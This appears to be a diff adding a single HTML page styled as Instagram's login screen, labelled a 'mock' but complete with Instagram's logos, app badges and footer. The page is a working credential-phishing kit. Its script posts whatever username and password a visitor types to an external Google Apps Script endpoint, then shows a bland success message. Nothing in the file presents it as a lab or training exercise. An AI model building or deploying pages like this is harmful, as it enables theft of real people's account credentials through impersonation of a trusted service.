@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Mock Login</title>
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 90vh;
+    }
+    .login-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      width: 350px;
+      padding: 40px;
+      text-align: center;
+      border-radius: 10px;
+    }
+    .login-box img.logo {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      background: #fafafa;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .forgot {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #00376b;
+      cursor: pointer;
+    }
+    .divider {
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      text-align: center;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+    .divider:not(:empty)::before {
+      margin-right: .25em;
+    }
+    .divider:not(:empty)::after {
+      margin-left: .25em;
+    }
+    .signup-box {
+      border: 1px solid #dbdbdb;
+      background-color: white;
+      text-align: center;
+      padding: 20px;
+      margin-top: 10px;
+      border-radius: 10px;
+    }
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .get-app {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .get-app img {
+      width: 135px;
+      margin: 5px;
+    }
+    .success-message {
+      margin-top: 20px;
+      display: none;
+      color: green;
+      font-weight: bold;
+    }
+    .checkmark {
+      display: inline-block;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background-color: #28a745;
+      color: white;
+      font-size: 20px;
+      line-height: 30px;
+      margin-bottom: 10px;
+    }
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+    }
+    footer a {
+      color: #999;
+      margin: 0 10px;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div>
+    <div class="login-box">
+      <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+      <input type="text" id="username" placeholder="Phone number, username or email">
+      <input type="password" id="password" placeholder="Password">
+      <button onclick="submitLogin()">Log In</button>
+      <div class="success-message" id="successMessage">
+        <div class="checkmark">✓</div>
+        Your request has been processed
+      </div>
+      <div class="forgot">Forgot password?</div>
+    </div>
+
+    <div class="signup-box">
+      Don’t have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="get-app">
+      <p>Get the app.</p>
+      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png" alt="App Store">
+      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/6071ff478b70.png" alt="Google Play">
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div>
+    <a href="#">Meta</a>
+    <a href="#">About</a>
+    <a href="#">Blog</a>
+    <a href="#">Jobs</a>
+    <a href="#">Help</a>
+    <a href="#">API</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Locations</a>
+    <a href="#">Instagram Lite</a>
+  </div>
+  <div style="margin-top:10px;">© 2025 Instagram from Meta</div>
+</footer>
+
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbw9T0FOtzbcI0Yn8kjZG4rqziTmXg2XnWHzX7W3fybkPKBAoSVA2oqbZs9S5z2BDEvB/exec";
+
+  function submitLogin() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    if (!username || !password) {
+      alert("Please fill in both fields.");
+      return;
+    }
+
+    fetch(scriptURL, {
+      method: 'POST',
+      body: JSON.stringify({ username, password }),
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    })
+    .then(() => {
+      document.getElementById("successMessage").style.display = "block";
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+    })
+    .catch(error => alert('Error: ' + error.message));
+  }
+</script>
+
+</body>
+</html>
